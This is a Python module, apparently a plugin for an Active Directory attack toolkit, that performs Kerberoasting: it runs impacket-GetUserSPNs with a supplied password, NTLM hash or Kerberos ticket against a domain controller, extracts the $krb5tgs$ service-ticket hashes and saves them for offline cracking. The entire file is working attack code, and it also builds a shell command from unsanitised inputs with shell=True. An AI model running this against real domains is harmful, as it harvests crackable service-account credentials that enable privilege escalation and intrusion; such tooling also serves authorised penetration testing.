PROVIDES = ["kerberoast_hashes"]
REQUIRES = []

def run(data, cred, args):
    import subprocess
    from pathlib import Path

    quiet = getattr(args, "quiet", False)

    domain = data.get("domain")
    dc = data.get("ip")

    if not domain or not dc:
        print("[!] Missing domain or DC IP")
        return

    if not cred:
        print("[!] Kerberoasting requires credentials")
        return

    output = getattr(args, "out", None) or "kerberoast_hashes.txt"
    output_file = Path(output).expanduser().resolve()

    user = cred["user"]
    typ = cred["type"]
    secret = cred["secret"]

    # ---------------- BUILD COMMAND ----------------
    if typ == "password":
        cmd = f"impacket-GetUserSPNs {domain}/{user}:{secret} -dc-ip {dc} -request"

    elif typ == "ntlm":
        cmd = f"impacket-GetUserSPNs {domain}/{user} -hashes :{secret} -dc-ip {dc} -request"

    elif typ == "ticket":
        cmd = f"KRB5CCNAME={secret} impacket-GetUserSPNs {domain}/ -dc-ip {dc} -request -k"

    else:
        print("[!] Unsupported credential type")
        return

    print(f"[*] Running: {cmd}\n")

    # ---------------- RUN ----------------
    result = subprocess.run(
        cmd,
        shell=True,
        capture_output=True,
        text=True
    )

    if not quiet and result.stdout:
        print(result.stdout)

    # ---------------- PARSE ----------------
    hashes = [
        line for line in result.stdout.splitlines()
        if "$krb5tgs$" in line
    ]

    if not hashes:
        print("[!] No Kerberoast hashes found")
        return

    # ---------------- SAVE ----------------
    output_file.write_text("\n".join(hashes))

    print(f"[+] Saved {len(hashes)} hashes → {output_file}")